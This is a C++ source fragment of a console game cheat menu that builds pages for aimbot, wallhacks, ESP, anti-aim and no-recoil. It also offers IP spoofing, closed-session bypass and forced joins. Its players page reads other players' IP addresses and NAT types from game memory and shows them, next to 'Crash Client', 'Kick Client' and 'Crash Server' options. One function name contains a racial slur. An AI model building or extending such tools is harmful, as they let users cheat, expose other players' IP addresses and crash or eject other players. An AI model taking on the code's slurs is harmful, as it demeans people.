			addBar(hash("Animate Layer3"), -1.0f, 1.0f, menu->Layer3Scroll, 0.01f, hash("Animation"));
			addCheck2(hash("WireFrame Weapon"), menu->wireframe, hash("Enables wireframe"));
			addColorSubmenu(hash("Camo Color"), ID_CRGB, menu->rgbac);
			addOption(hash("Reset Mods"), enableresetweaponized);
		}
		break;
	case ID_PLAYER:
		addTitle(hash("Player Assets"), ID_CAMO);
		addCombo(hash("Player Materials"), playertypes, SizeOf(playertypes), bot.playertype, player_type, playertypes);
		break;
	case ID_CAMOS:
		addTitle(hash("Custom Weaponized Camos"), ID_CAMO);
		for (int i = 0; i < CamoV.size(); i++) {
			addCamoOption(CamoV.at(i).c_str());
		}
		break;
	case ID_CRGB:
		addTitle(hash("Camo Color"), ID_CAMO);
		addCheck2(hash("Enable"), menu->camocolor, hash("Toggles modification of this camo color"));
		if (menu->camocolor) {
			addColormenu1(hash("Current Color"), menu->rgbac);
			addColorEBar(hash("Red"), 0.0f, 1.0f, hash("Red color"), menu->rgbac.r, 0.01f, true);
			addColorEBar(hash("Green"), 0.0f, 1.0f, hash("Green color"), menu->rgbac.g, 0.01f, true);
			addColorEBar(hash("Blue"), 0.0f, 1.0f, hash("Blue color"), menu->rgbac.b, 0.01f, true);
			addColorEBar(hash("Alpha"), 0.0f, 1.0f, hash("Alpha"), menu->rgbac.a, 0.01f, true);
			addColormenuE(hash("Red"), color(255, 0, 0, 255), menu->rgbac);
			addColormenuE(hash("Yellow"), color(255, 255, 0, 255), menu->rgbac);
			addColormenuE(hash("Orange"), color(255, 128, 0, 255), menu->rgbac);
			addColormenuE(hash("Green"), color(128, 255, 0, 255), menu->rgbac);
			addColormenuE(hash("Blue"), color(0, 128, 255, 255), menu->rgbac);
			addColormenuE(hash("Purple"), color(128, 0, 255, 255), menu->rgbac);
			addColormenuE(hash("Pink"), color(255, 0, 128, 255), menu->rgbac);
			addColormenuE(hash("Aqua Green"), color(24, 119, 72, 255), menu->rgbac);
			addColormenuE(hash("Sky Blue"), color(24, 189, 240, 255), menu->rgbac);
			addColormenuE(hash("Cerulean"), color(65, 60, 219, 255), menu->rgbac);
			addColormenuE(hash("Magenta"), color(254, 39, 57, 255), menu->rgbac);
			addColormenuE(hash("Wisteria"), color(12, 186, 92, 255), menu->rgbac);
			addColormenuE(hash("Lime Green"), color(53, 254, 75, 255), menu->rgbac);
			addColormenuE(hash("Golden Yellow"), color(207, 179, 55, 255), menu->rgbac);
			addColormenuE(hash("Red Orange"), color(204, 51, 27, 255), menu->rgbac);
			addCheck2(hash("Enable RGB"), menu->rgbac.Rainbow, hash("Enables chameleon RGB"));
			if (menu->rgbac.Rainbow)
				addBar(hash("RGB Fade"), 0.0f, 1.0f, menu->rgbac.RainbowSpeed, 0.01f, hash("Color transition speed"));
		}
		break;
	case ID_AIMBOT:
		addTitle(hash("Aimbot"), ID_MAIN);
		addCheck2(hash("Player Aimbot"), bot.benable, hash("Enables auto-aim to players"));
		addCombo(hash("Method"), aimtypes, SizeOf(aimtypes), bot.aimtype, aim_type, aimtypesDec);
		addCombo(hash("Tag"), tagtypes, SizeOf(tagtypes), bot.tagtype, tag_type, tagtypesDec);
		addBarI(hash("Bone Scan Strength"), 1, 12, bot.loop_number_autobone, 1, hash("Times client gets scanned per frame"));
		if (bot.aimtype == AIM_TYPE_TRIGGERBOT) {
			if (!runoneces1) {
				Savedtagtype = bot.tagtype;
				Savedkeytype = bot.keytype;
				runoneces1 = true;
				bot.keytype = KEY_L1;
				bot.tagtype = tj_spineupper;
				runoneces = true;
			}
			addCheck2(hash("Fov Circle"), bot.bcircle, hash("Draws fov circle"));
			if (bot.bcircle) {
				addBar(hash("Fov Circle Scale"), 0, 200, bot.fovs, 5.0f, hash("Fov circle"));
			}
			addBar(hash("Smooth Snap Scale"), 1, 6.5f, bot.snaps, 0.1f, hash("Smooth snap"));
		} else {
			if (runoneces) {
				bot.keytype = Savedkeytype;
				bot.tagtype = Savedtagtype;
				runoneces = false;
				runoneces1 = false;
			}
		}
		addCombo(hash("Aim Key"), keytypes, SizeOf(keytypes), bot.keytype, key_type, keytypesDec);
		if (bot.keytype == KEY_L1)
			addBar(hash("ADS Zoom Scale"), 0, 0.90, bot.ads, 0.01f, hash("Aim down sights zoom"));
		addBar(hash("Velocity Prediction"), 0.0, 0.9316, bot.fprediction, 0.01f, hash("Predicts targets new velocity origin"));
		addCheck2(hash("Visible"), bot.bvisible, hash("Engages targets when visible"));
		addCheck2(hash("Autowall"), bot.bautowall, hash("Engages targets if bullets trace through walls"));
		addCheck2(hash("FPS Saving"), menu->fpssaving, hash("Toggles Fps saving"));
		if (menu->fpssaving)
			addBarI(hash("FPS Saving Strength"), 0, 200, menu->fpsstrnth, 1, hash("High values will affect autowall "));
		addCheck2(hash("Aim Lock"), bot.benablal, hash("Locks right analog when engaging"));
		addCheck2(hash("Remove Spread"), bot.bnospread, hash("Removes weapons spread"));
		addCheck2(hash("Remove Flinch"), bot.bnoflinch, hash("Removes flinch when hit"));
		addCheck2(hash("Remove Sway"), bot.bnosway, hash("Removes weapons sway"));
		addCheck2(hash("Remove Bob"), bot.bnobob, hash("Removes weapons bob"));
		addCheck2(hash("Remove Recoil"), bot.bnorec, hash("Removes weapons recoil"));
		addCheck2(hash("Remove Kick"), bot.bnokick, hash("Removes weapons kick"));
		addCheck2(hash("Cancel Reload"), bot.cancelreload, hash("Cancels reload animation"));
		addCheck2(hash("Auto Crouch"), bot.bautocrouch, hash("Crouches on damage event"));
		addCheck2(hash("Autoshoot"), bot.bautoshoot, hash("Auto engages targets"));
		break;
	case ID_ANTIAIM:
		addTitle(hash("Antiaim"), ID_MAIN);
		addCheck2(hash("Enable"), bot.benableanti, hash("Enables anti aim"));
		addCheck2(hash("Air Stuck ^7 ^BPS3ButtonDpadU^"), bot.bIsAirStuck, hash("The stuck"));
		addCheck2(hash("Lean ^7 ^BPS3ButtonDpadL^ & ^BPS3ButtonDpadR^"), bot.blean, hash("The peaking"));
		addCheck2(hash("Snake ^7 ^BPS3ButtonDpadD^"), bot.snake_bot, hash("The hate"));
		addCheck2(hash("Third Person"), bot.bthirdp, hash("Toggles 3rd person"));
		addCheck2(hash("Unlock Angles"), bot.block3dpaa, hash("Toggles angle locking, use 3rd person to configure"));
		addCheck2(hash("Advanced Options"), bot.baaadvanced, hash("Toggles advanced x/y options"));
		if (bot.baaadvanced) {
			addCombo(hash("Firing Yaw"), antiaimtypesX, SizeOf(antiaimtypesX), bot.antitypeX[FIRING], anti_typeFX, antiaimtypesDecX);
			addCombo(hash("Sprinting Yaw"), antiaimtypesX, SizeOf(antiaimtypesX), bot.antitypeX[SPRINTING], anti_typeSX, antiaimtypesDecX);
			addCombo(hash("Crouching Yaw"), antiaimtypesX, SizeOf(antiaimtypesX), bot.antitypeX[CROUCHING], anti_typeCX, antiaimtypesDecX);
			addCombo(hash("Standing Yaw"), antiaimtypesX, SizeOf(antiaimtypesX), bot.antitypeX[STANDING], anti_typeSTX, antiaimtypesDecX);
			addCombo(hash("Moving Yaw"), antiaimtypesX, SizeOf(antiaimtypesX), bot.antitypeX[MOVING], anti_typeMX, antiaimtypesDecX);
			addCombo(hash("Snake Yaw"), antiaimtypesX, SizeOf(antiaimtypesX), bot.antitypeX[SNAKE], anti_typeSKX, antiaimtypesDecX);

			addCombo(hash("Firing Pitch"), antiaimtypesY, SizeOf(antiaimtypesY), bot.antitypeY[FIRING], anti_typeFY, antiaimtypesDecY);
			addCombo(hash("Sprinting Pitch"), antiaimtypesY, SizeOf(antiaimtypesY), bot.antitypeY[SPRINTING], anti_typeSY, antiaimtypesDecY);
			addCombo(hash("Crouching Pitch"), antiaimtypesY, SizeOf(antiaimtypesY), bot.antitypeY[CROUCHING], anti_typeCY, antiaimtypesDecY);
			addCombo(hash("Standing Pitch"), antiaimtypesY, SizeOf(antiaimtypesY), bot.antitypeY[STANDING], anti_typeSTY, antiaimtypesDecY);
			addCombo(hash("Moving Pitch"), antiaimtypesY, SizeOf(antiaimtypesY), bot.antitypeY[MOVING], anti_typeMY, antiaimtypesDecY);
			addCombo(hash("Snake Pitch"), antiaimtypesY, SizeOf(antiaimtypesY), bot.antitypeY[SNAKE], anti_typeSKY, antiaimtypesDecY);

			addBar(hash("Custom Pitch Scale"), -68.0f, 68.0f, bot.custompitchscale, 1.0f, hash("Custom pitch (works with jitter)"));
			addBar(hash("Jitter Pitch Delay Scale"), 0, 1000, bot.pitchscalex, 20.0f, hash("Jitter pitch delay"));
			addBar(hash("Jitter Yaw Delay Scale"), 0, 1000, bot.pitchscaley, 20.0f, hash("Jitter yaw delay"));
			addBar(hash("Spin Yaw Scale"), 0, 45, bot.spinscale, 0.5f, hash("360 spin"));
		} else {
			addCheck2(hash("Riot Backwards"), bot.breversebot, hash("Riot backwards"));
			addCheck2(hash("Semi-Up"), bot.blockup, hash("Locks pitch angles semi-up"));
			if (!bot.blockup) {
				addBar(hash("Jitter X Delay Scale"), 0, 1000, bot.pitchscalex, 20.0f, hash("Jitter pitch delay"));
			}
			if (!bot.breversebot) {
				addBar(hash("Jitter Yaw Delay Scale"), 0, 1000, bot.pitchscaley, 20.0f, hash("Jitter yaw delay"));
				if (!bot.pitchscaley) {
					addBar(hash("Spin Yaw Scale"), 0, 75, bot.spinscale, 0.5f, hash("360 spin"));
				}
			}
		}
		addBar(hash("Fake Lag Scale"), 0, 15, bot.fakelagscale, 0.5f, hash("Artificial lag"));
		break;
	case ID_ESP:
		addTitle(hash("Extra-Sensory Perception"), ID_MAIN);
		addCheck2(hash("Friendlys"), bot.esp.ballies, hash("Draws friendlys"));
		addCheck2(hash("Enemys"), bot.esp.baxis, hash("Draws enemys"));
		addCombo(hash("Bound"), bound_type, SizeOf(bound_type), bot.esp.bound, set_bound, bound_typedec);
		addCombo(hash("Snaplines"), snap_type, SizeOf(snap_type), bot.esp.snaplines, set_snap, snap_typedec);
		addCheck2(hash("Names"), bot.esp.bnames, hash("Draws names"));
		addCheck2(hash("Crosshair Compass"), bot.esp.bcompass, hash("Draws pointers around crosshair"));
		addCheck2(hash("Health Bar"), bot.esp.bhealthbar, hash("Draws your current health bar"));
		addCheck2(hash("Sprint Meter"), bot.esp.sprintmeter, hash("Draws sprint meter"));
		addCheck2(hash("Crosshair"), bot.esp.bdynamic, hash("Draws halo styled crosshair"));
		if (bot.esp.bdynamic) {
			addCheck2(hash("Dynamic Crosshair"), bot.customxhd, hash("Draws crosshair dynamic"));
			addSubmenu(hash("Custom Crosshair"), ID_XHC);
		}
		addSubmenu(hash("External Radar"), ID_RADAR);
		addSubmenu(hash("Chams"), ID_CHAMS);
		addSubmenu(hash("World Entitys"), ID_WORLDENTS);
		addSubmenu(hash("Tracers"), ID_TRACERS);
		if (local->ishost) {
			addCheck2(hash("Client Health Bars"), bot.esp.clienthealth, hash("Draws clients health"));
		} else {
			bot.esp.clienthealth = false;
		}
		addCheck2(hash("Target Info"), bot.esp.btargetinfo, hash("Draws targets information"));
		addCheck2(hash("Proximity Warning"), bot.esp.bprox, hash("Draws proximity warnings"));
		addCheck2(hash("V-Angles"), bot.esp.bvangles, hash("Draws players view angles (possible drop in fps)"));
		addCheck2(hash("Laser"), bot.blaser, hash("Draws laser on every weapon"));
		break;
	case ID_TRACERS:
		addTitle(hash("Engine Tracers"), ID_ESP);
		addCheck2(hash("Tracers"), bot.esp.btracers, hash("Draws bullet tracers"));
		addBar(hash("Fade Time"), 0.0f, 6.0f, menu->fadeTime, 0.1f, hash("Fade time"));
		addBar(hash("Fade Scale"), 0.0f, 3.0f, menu->fadeScale, 0.1f, hash("Fade scale"));
		addBar(hash("Beam Width"), 0.0f, 15.0f, menu->beamWidth, 0.5f, hash("Beam width"));
		addBar(hash("Beam Length"), 0.0f, 10000.0f, menu->beamLength, 100.0f, hash("Beam length"));
		addBar(hash("Screw Radius"), 0.0f, 30.0f, menu->screwRadius, 0.1f, hash("Screw radius"));
		addBar(hash("Screw Dist"), 0.0f, 20.0f, menu->screwDist, 0.1f, hash("Screw distance"));
		break;
	case ID_XHC:
		addTitle(hash("Custom Crosshair"), ID_ESP);
		addCheck2(hash("Enable Custom Crosshair"), bot.customxh, hash("Draws custom static crosshair"));
		if (bot.customxh) {
			addCheck2(hash("Dynamic Crosshair"), bot.customxhd, hash("Draws custom dynamic crosshair"));
			addBar(hash("Pattern x"), -100.0f, 100.0f, bot.customw, 1.0f, hash("Pattern x"));
			addBar(hash("Pattern y"), -100.0f, 100.0f, bot.customh, 1.0f, hash("Pattern y"));
			addBar(hash("Thickness"), 1.0f, 5, bot.customt, 1.0f, hash("Thickness"));
			addBar(hash("Rotate"), 0.0f, 180.0f, bot.customr, 45.0f, hash("Rotation"));
			addBar(hash("Spin"), 0, 100.0f, bot.customrs, 1.0f, hash("Spin speed"));
			addOption(hash("EasterEgg Crosshair"), NaziNiggerThingy);
		}
		break;
	case ID_CHAMS:
		addTitle(hash("Chams"), ID_ESP);
		addCheck2(hash("Enable Chams"), bot.esp.bchams, hash("Color chameleon skin"));
		addCheck2(hash("Enable Weapon Chams"), bot.esp.bweaponchams, hash("Color weapons chameleon skin"));
		if (bot.esp.bchams) {
			addCheck2(hash("Enable Local Player Chams"), menu->renderchamsonme, hash("Renders chams on your player"));
			addBar(hash("Chams Intensity"), 0, 10, bot.chamsintensity, 0.5f, hash("Chams Intensity"));
		}
		addCheck2(hash("Player Wallhack"), bot.esp.bwall, hash("Renders players through walls"));
		addCheck2(hash("Weapon Wallhack"), bot.esp.bwwall, hash("Renders weapons through walls"));
		addCheck2(hash("Entity Wallhack"), bot.esp.ebwall, hash("Renders entitys through walls"));
		break;
	case ID_WORLDENTS:
		addTitle(hash("World Entity ESP"), ID_ESP);
		addCheck2(hash("Enable"), bot.esp.benableworldents, hash("Enables world entitys esp"));
		addCheck2(hash("Weapons"), bot.esp.bweapsworld, hash("Draws Players current weapons"));
		addCheck2(hash("Weapon Items"), bot.esp.bpickupweaponsworld, hash("Draws weapon pick up items"));
		addCheck2(hash("Grenades"), bot.esp.bnadesworld, hash("Draws nades"));
		addCheck2(hash("Scavenger Bags"), bot.esp.bpickupscavsworld, hash("Draws scavenger bag pick up entitys"));
		addCheck2(hash("Projectile Fuse Time"), bot.esp.benablenadefuse, hash("Draws the remaining fuse time"));
		addCheck2(hash("Projectile Tracers"), bot.esp.bnadetracers, hash("Draws trail like tracers"));
		break;
	case ID_RADAR:
		addTitle(hash("External Radar"), ID_ESP);
		addCheck2(hash("Enable"), bot.esp.bradar, hash("Draws custom radar"));
		addCheck2(hash("Orbital VSAT"), bot.esp.bplayers, hash("Draws players vsat"));
		addBar(hash("Compass Scale"), 0.0f, 2700.0f, bot.esp.scale, 100.0f, hash("Maps range"));
		addBar(hash("Compass Size"), 160.0f, 260.0f, bot.esp.scalewh, 1.0f, hash("Maps size"));
		addCheck2(hash("Grenades"), bot.esp.bradrnades, hash("Draws nades"));
		addCheck2(hash("Weapon Items"), bot.esp.bradrpickupweaps, hash("Draws players current weapons"));
		addCheck2(hash("Scavenger Bags"), bot.esp.bradrpickupscavs, hash("Draws scavenger bag pick up entitys"));
		addCheck2(hash("Helicopters"), bot.esp.bradrhelis, hash("Draws helicopters"));
		addCheck2(hash("Dogos"), bot.esp.bradrdogos, hash("Draws dogos"));
		addCheck2(hash("Vehicles"), bot.esp.bradrvehicles, hash("Draws vehicles"));
		addCheck2(hash("Turrets"), bot.esp.bradrturrets, hash("Draws turrets"));
		addCheck2(hash("Artillery"), bot.esp.bradrartillery, hash("Draws artillery"));
		addCheck2(hash("Tracers"), bot.esp.bradartracers, hash("Draws tracers"));
		break;
	case ID_CHEATS:
		addTitle(hash("Cheats"), ID_MAIN);
		addBar(hash("Fov"), 10, 165, menu->frenderfovx, 1.0f, hash("Field of view"));
		addCheck2(hash("Bypass Closed Sessions"), menu->bClosedBypass, hash("Enable to join closed sessions"));
		addCheck2(hash("Remove Flash"), bot.noflsh, hash("Removes flashbang fx"));
		addCheck2(hash("Force Invite"), menu->bForceInv, hash("Allows you to force join people via invites"));
		addCheck2(hash("Unlimited Class Slots"), local->unlimitedSlots, hash("Toggles unlimited class slots"));
		addCheck2(hash("Toggle Gun Sounds"), menu->bgunsound, hash("Toggles gun fire sounds"));
		addCheck2(hash("Night Mode"), menu->nightmode, hash("Toggles night mode"));
		addCheck2(hash("Full Bright"), bot.bfullbright, hash("Toggles full bright"));
		addBar(hash("Prop Size"), 0.0f, 10.0f, menu->props, 0.1f, hash("Props size"));
		addCheck2(hash("Smoke Color"), menu->smokec, hash("Toggles smoke color modification"));
		addCheck2(hash("Sky Color"), menu->skyc, hash("Toggles sky color modification"));
		addCheck2(hash("Sky Rotate"), menu->skyr, hash("Toggles sky rotation"));
		addCheck2(hash("Spoof IP"), menu->ip_spoofing, hash("Spoof ip address, go back to main menu once toggled"));
		addOption(hash("End Game"), EndGame);
		addOption(hash("Leave Game"), Disconnect);
		addOption(hash("Crash Server"), send_server_crash);
		break;
	case ID_GAMERTAG:
		addTitle(hash("GamerTag"), ID_MAIN);
		addCheck2(hash("Hide Name"), bot.hidename, hash("Hides your name"));
		addCheck2(hash("32 Name Patcher"), menu->i32_Name, hash("Toggles 32 char name"));
		addKOption(hash("Change Name"), ChangeName);
		addCheck2(hash("Flash Name"), menu->flshname, hash("Flashes gamer tag ingame / pregame"));
		addCheck2(hash("Advertise Menu"), menu->addname, hash("Advertises the menu ingame / pregame"));
		addCheck2(hash("Advertise Discord"), menu->addname1, hash("Advertises the discord ingame / pregame"));
		addOption(hash("Reset Name"), ResetName);
		break;
	case ID_PLAYERS:
		addTitle(hash("Players"), ID_MAIN);

		for (int i = 0; i < 18; i++) {

			const char* playerIP;
			int ip;

			if (*(bool*)0x0FA7A03) {
				ip = *(int*)(0x0F9E726 + i * 0x148);
			}

			else {
				ip = *(int*)(0x0FA9A2E + i * 0x148);
			}

			if (ip != 0) {
				int p1 = (ip & 0xff000000) >> 24;
				int p2 = (ip & 0x00ff0000) >> 16;
				int p3 = (ip & 0x0000ff00) >> 8;
				int p4 = (ip & 0x000000ff) >> 0;
				char boolBuff[100];
				snprintf(boolBuff, sizeof(boolBuff), hash("IP: Hidden"));
				snprintf(boolBuff, sizeof(boolBuff), V3_Users[i] ? hash("IP: Hidden") : hash("IP: %i.%i.%i.%i"), p1, p2, p3, p4);
				playerIP = boolBuff;
			}

			else {
				playerIP = hash("0.0.0.0");
			}

			if (!cl_ingame_()) {
				if (*(bool*)0x0FA7A03)//Lobby or Party
				{
					nameip[i] = (const char*)(0x0F9E698 + (i * 328));//Lobby
					ReadMemory(0x0F9E72C + (i * 328), &nattype, 0x01);
				} else {
					nameip[i] = (const char*)0x0FA99A0 + (i * 328);//Party
					ReadMemory(0x0FA9A34 + (i * 328), &nattype, 0x01);
				}
			} else {
				nameip[i] = cg->clients[i].PlayerName;
				ReadMemory(0x0F9E72C + (i * 328), &nattype, 0x01);
			}
			if (strcmp(nameip[i], "")) {

				snprintf(NatBufff, sizeof(NatBufff), hash("NatType: %s"), V3_Users[i] ? hash("Hidden") : nattype == 1 ? hash("^2Open") : nattype == 2 ? hash("^3Moderate") : nattype == 0 ? hash("^1Strict") : hash("Null"));

				char v3[60]; char gaybab[60];
				snprintf(v3, sizeof(v3), hash("%s ^2[GenV3.4 User]"), nameip[i]);
				snprintf(gaybab, sizeof(gaybab), hash("%s ^1[Gaybab User]"), nameip[i]);

				Com_Sprintf(MenuBufff, sizeof(MenuBufff), CG_IsEntityFriendlyNotEnemy(&centity[i]) ? hash("^2%s %s") : hash("^1%s %s"), V3_Users[i] ? v3 : gaybab_Users[i] ? gaybab : nameip[i], local->pplayer[i] ? hash("^2[Prioritized]") : local->iplayer[i] ? hash("^1[Ignored]") : "");
				addPlayerSub(MenuBufff, playerIP, NatBufff, ID_PLAYERS_SUB);
			}
		}
		break;
	case ID_PLAYERS_SUB:
		String pszName;
		String pszNpid;
		String pszPing;

		if (!cl_ingame_()) {
			if (*(bool*)0x0FA7A03)//Lobby or Party
			{
				pszName = (const char*)0x0F9E698 + (Mshit.scroll[ID_PLAYERS] * 328);//Lobby
				pszNpid = (const char*)0x00F9E6D4 + (Mshit.scroll[ID_PLAYERS] * 328);//Lobby
			} else {
				pszName = (const char*)0x0FA99A0 + (Mshit.scroll[ID_PLAYERS] * 328);//Party
				pszNpid = (const char*)0x0FA99DC + (Mshit.scroll[ID_PLAYERS] * 328);//Party
			}
		} else {
			pszName = cg->clients[Mshit.scroll[ID_PLAYERS]].PlayerName;
			pszNpid = (const char*)0x00F9E6D4 + (Mshit.scroll[ID_PLAYERS] * 328);//Lobby
		}

		char v3[60]; char gaybab[60];
		snprintf(v3, sizeof(v3), hash("%s ^2[GenV3.4 User]"), pszName);
		snprintf(gaybab, sizeof(gaybab), hash("%s ^1[Gaybab User]"), pszName);
		addTitle(V3_Users[Mshit.scroll[ID_PLAYERS]] ? v3 : gaybab_Users[Mshit.scroll[ID_PLAYERS]] ? gaybab : pszName, ID_PLAYERS);
		addCheck2(hash("Prioritize"), local->pplayer[Mshit.scroll[ID_PLAYERS]], hash("Prioritizes player"));
		addCheck2(hash("Ignore"), local->iplayer[Mshit.scroll[ID_PLAYERS]], hash("Ignores player"));
		AddFriendOption(hash("Add Friend To List"), hash("Adds a player to your fake friends list"), pszName, pszNpid, true);
		SendConnOption(hash("Crash Client"), hash("Crashes selected player"), Mshit.scroll[ID_PLAYERS]);
		SendPsegOption(hash("Crash Party Client"), hash("Crashes selected player when you're party host"), Mshit.scroll[ID_PLAYERS]);
		SendKickOption(hash("Kick Client"), hash("Kicks selected player"), Mshit.scroll[ID_PLAYERS]);
		snprintf(cooldownBufff, sizeof(cooldownBufff), hash("Kicks selected player to zombies (^1%i ^7second timeout)"), pullcooldown);
		SendZMOption(hash("Send to Zombies"), cooldownBufff, Mshit.scroll[ID_PLAYERS]);
		snprintf(stoptimeoutamout, sizeof(stoptimeoutamout), hash("Stops current attack (^1%i ^7second timeout)"), pullcooldown);
		addCOption(hash("Stop Current Attack"), stoptimeoutamout, StopAtak);
		break;
	case ID_PLAYERSV1:
		addTitle(hash("Players"), ID_EXPLOITS);

		for (int i = 0; i < 18; i++) {

			if (!cl_ingame_()) {
				if (*(bool*)0x0FA7A03)//Lobby or Party
				{
					nameip[i] = (const char*)(0x0F9E698 + (i * 328));//Lobby
					ReadMemory(0x0F9E72C + (i * 328), &nattype, 0x01);
				} else {
					nameip[i] = (const char*)0x0FA99A0 + (i * 328);//Party
					ReadMemory(0x0FA9A34 + (i * 328), &nattype, 0x01);
				}
			} else {
				nameip[i] = cg->clients[i].PlayerName;
				ReadMemory(0x0F9E72C + (i * 328), &nattype, 0x01);
			}
			if (strcmp(nameip[i], "")) {
				char v3[60]; char gaybab[60];
				snprintf(v3, sizeof(v3), hash("%s ^2[GenV3.4 User]"), nameip[i]);
				snprintf(gaybab, sizeof(gaybab), hash("%s ^1[Gaybab User]"), nameip[i]);
				Com_Sprintf(MenuBufff, sizeof(MenuBufff), CG_IsEntityFriendlyNotEnemy(&centity[i]) ? hash("^2%s %s") : hash("^1%s %s"), V3_Users[i] ? v3 : gaybab_Users[i] ? gaybab : nameip[i]);
				addPlayerSubV1(MenuBufff, ID_PLAYERS_SUBV1);
			}
		}
		break;
	case ID_PLAYERS_SUBV1:
		if (!cl_ingame_()) {
			if (*(bool*)0x0FA7A03)//Lobby or Party
			{
				pszName = (const char*)0x0F9E698 + (Mshit.scroll[ID_PLAYERSV1] * 328);//Lobby
				pszNpid = (const char*)0x00F9E6D4 + (Mshit.scroll[ID_PLAYERSV1] * 328);//Lobby
			} else {
				pszName = (const char*)0x0FA99A0 + (Mshit.scroll[ID_PLAYERSV1] * 328);//Party
				pszNpid = (const char*)0x0FA99DC + (Mshit.scroll[ID_PLAYERSV1] * 328);//Party
			}
		} else {
			pszName = cg->clients[Mshit.scroll[ID_PLAYERSV1]].PlayerName;
			pszNpid = (const char*)0x00F9E6D4 + (Mshit.scroll[ID_PLAYERSV1] * 328);//Lobby
		}

		addTitle(pszName, ID_PLAYERSV1);
		AddFriendOption(hash("Add Friend To List"), hash("Adds a player to your fake friends list"), pszName, pszNpid, true);
		SendConnOption(hash("Crash Client"), hash("Crashes selected player"), Mshit.scroll[ID_PLAYERSV1]);
		SendPsegOption(hash("Crash Party Client"), hash("Crashes selected player when you're party host"), Mshit.scroll[ID_PLAYERS]);
		SendKickOption(hash("Kick Client"), hash("Kicks selected player"), Mshit.scroll[ID_PLAYERSV1]);
		snprintf(cooldownBufff, sizeof(cooldownBufff), hash("Kicks selected player to zombies (^1%i ^7second timeout)"), pullcooldown);
		SendZMOption(hash("Send to Zombies"), cooldownBufff, Mshit.scroll[ID_PLAYERSV1]);
		snprintf(stoptimeoutamout, sizeof(stoptimeoutamout), hash("Stops current attack (^1%i ^7second timeout)"), pullcooldown);
		addCOption(hash("Stop Current Attack"), stoptimeoutamout, StopAtak);
		break;
	case ID_RECENTLIST:
		addTitle(hash("Fake Friends"), ID_MAIN);
		for (int it = 0; it < friends::friend_count + friends::true_count; it++) {

			auto* _friend = (friend_list*)(0x26163a8 + (it * 0x108));

			if (_friend->name[0] != '\0')
				addFriendSubmenu(_friend->name, ID_RECENTS_SUB);
		}
		break;
	case ID_RECENTS_SUB:
		addTitle(hash("Player"), ID_RECENTLIST);
		char name[32];
		sprintf(name, hash("Delete %s"), iRecent.c_str());
		AddDelFriendOption(name, hash("Deletes said person from your fake list"), iRecent.c_str());
		break;
	case ID_ACCOUNT:
		addTitle(hash("Account"), ID_MAIN);
		addInt(hash("Rank"), 0, 55, 1, rank, hash("Changes rank (sets instantly)"), true);
		addInt(hash("Prestige"), 0, 255, 1, Prrank, hash("Changes Prestige (sets instantly)"), true);
		addCOption(hash("Unlock all"), local->stausrank, unlock_all);
		addInt(hash("Fake Rank Unlimited"), 0, 1000, 1, unlimitedrank, hash("Changes fake rank"), true);
		addCheck2(hash("Sticky DLC Camos"), menu->benablecamos, hash("Toggles dlc camos"));
		break;
	case ID_SETTINGS:
		addTitle(hash("Settings"), ID_MAIN);
		addSubmenu(hash("Server Info"), SERVER_INFO);
		addBarI(hash("Menu Option Count"), 5, 25, Mshit.max_options, 1, hash("Adjust the max options to show on screen"));
		snprintf(tempdBufff, sizeof(tempdBufff), hash("Toggles celsius temps (^1%i ^7second delay)"), tempd);
		addCheck2(hash("Toggle Celsius"), menu->fahrenheit, tempdBufff);
		addCheck2(hash("Disable CPU"), menu->temp1, hash("Toggles cpu temps info"));
		addCheck2(hash("Disable RSX"), menu->temp2, hash("Toggles rsx temps info"));
		addCheck2(hash("Disable FPS"), menu->fps, hash("Toggles fps info"));
		addCheck2(hash("Disable Resolution"), menu->res, hash("Toggles resolution info"));
		addCheck2(hash("Disable FPS Saving"), menu->fmpssaving, hash("Toggles fps saving info"));
		addCheck2(hash("Disable DLC"), menu->disabledlc, hash("Toggles dlc"));
		addCheck2(hash("Spinning Weapons"), menu->sping, hash("Toggles spinning weapon animations"));
		addCheck2(hash("Disable Menu Sounds"), menu->engnsounds, hash("Toggles menu sounds"));
		addCheck2(hash("Trickshot Mode"), menu->btrickmode, hash("Disables the genisys hud"));
		addBar(hash("Scroll Speed Delay"), 50, 250, bot.scspeed, 10.0f, hash("Changes the scoller speed"));
		addBarI(hash("Search Session Max Ping"), 20, 420, menu->SMPing, 10, hash("Search session dedicated max ping"));
		addKOption(hash("Local Command"), local_command);
		addOption(hash("PS Button"), Psbutn);
		addCheck2(hash("Host AutoWall Override"), menu->hostawor, hash("Enable if host is suspected of host autowall"));
		break;
	case SERVER_INFO:
		addTitle(hash("Server Info"), ID_SETTINGS);
		addCheck2(hash("Disable Server Info"), menu->serverinfo, hash("Toggles server info"));
		addCheck2(hash("Disable Host Name"), menu->host, hash("Toggles host"));
		addCheck2(hash("Disable Map Name"), menu->map, hash("Toggles map"));
		addCheck2(hash("Disable Game Type Name"), menu->game, hash("Toggles game type"));
		addCheck2(hash("Disable Ping"), menu->ping, hash("Toggles ping"));
		addCheck2(hash("Disable Entitys"), menu->ents, hash("Toggles entitys"));
		addCheck2(hash("Disable Max Clients"), menu->maxc, hash("Toggles max clients"));
		break;
	case ID_THEME:
		addTitle(hash("Theme"), ID_MAIN);
		addSubmenu(hash("Preset Themes"), ID_CUSTOMTHEME);
		addSubmenu(hash("Placement"), ID_PLACEMENT);
		addSubmenu(hash("Border Colors"), ID_PRIMERY);
		addSubmenu(hash("ESP Colors"), ID_ESPTHEME);
		addCheck2(hash("Custom BO2 Theme"), menu->bo2theme, hash("Toggles the custom games color"));
		//addBar(hash("ScollBar Size"), 0, 12, menu->scrollbarsize, 0.01, hash("Changes the scollbar size"));
		//addBar(hash("Menu Height"), -12, 12, menu->height, 0.1, hash("Changes the scoller speed"));

		addBarI(hash("Width Size"), 300, 800, menu->msize, 10, hash("Width size of the menu"));
		addCheck2(hash("Enable Fade"), menu->fade, hash("Enables color fade transitions"));
		addCheck2(hash("Lock Colors"), menu->lockcolor, hash("Locks all color fade transitions"));
		if (menu->fade) {
			addBar(hash("RGB Fade"), 0.0f, 1.0f, menu->menufade, 0.01f, hash("Color transition speed"));
		}
		addOption(hash("Reset Theme"), enableresettheme);
		break;
	case ID_CUSTOMTHEME:
		addTitle(hash("Preset Themes"), ID_THEME);
		addColormenu(hash("Red"), color(255, 0, 0, 255));
		addColormenu(hash("Yellow"), color(255, 255, 0, 255));
		addColormenu(hash("Orange"), color(255, 128, 0, 255));
		addColormenu(hash("Green"), color(128, 255, 0, 255));
		addColormenu(hash("Blue"), color(0, 128, 255, 255));
		addColormenu(hash("Purple"), color(128, 0, 255, 255));
		addColormenu(hash("Pink"), color(255, 0, 128, 255));
